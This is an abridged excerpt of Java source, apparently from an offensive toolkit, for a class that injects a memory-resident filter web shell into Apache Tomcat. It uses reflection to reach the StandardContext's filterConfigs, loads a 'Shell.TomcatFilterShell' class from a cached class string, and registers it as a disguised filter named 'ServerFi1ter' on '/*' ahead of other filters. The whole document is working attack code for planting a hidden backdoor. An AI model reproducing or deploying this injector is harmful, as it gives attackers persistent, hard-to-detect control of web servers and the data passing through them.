...
public class TomcatInjectFilterShell {
    //参考：
    //https://mp.weixin.qq.com/s/nPAje2-cqdeSzNj4kD2Zgw
    //https://zhuanlan.zhihu.com/p/114625962

    public TomcatInjectFilterShell(){
        try {
            Tomcat6789 tomcat6789 = new Tomcat6789();
            String filterName = "ServerFi1ter";
            String urlPattern = "/*";
            ...
            try {
                ...
                standardContext = tomcat6789.getSTC();
            }
            Field field;
            Class standardContextClass;
            try {
                standardContextClass = standardContext.getClass();
                field = standardContextClass.getDeclaredField("filterConfigs");
            }catch (Exception e){
                try{
                    standardContextClass = standardContext.getClass().getSuperclass();
                    field = standardContextClass.getDeclaredField("filterConfigs");

                }catch (Exception b){
                    standardContextClass = standardContext.getClass().getSuperclass().getSuperclass();
                    field = standardContextClass.getDeclaredField("filterConfigs");
                }
            }
            ...
            if (map.get(filterName) == null) {
                ...
                Class clazz;
                try {
                    clazz = cl.loadClass("Shell.TomcatFilterShell");
                } catch (ClassNotFoundException e) {
                    ...
                    String codeClass = classCache.TomcatFilterShell;
                ...
                standardContextClass.getDeclaredMethod("addFilterDef", filterDefClass).invoke(standardContext, filterDef);
                ...
                standardContextClass.getDeclaredMethod("addFilterMapBefore", filterMapClass).invoke(standardContext, filterMap);
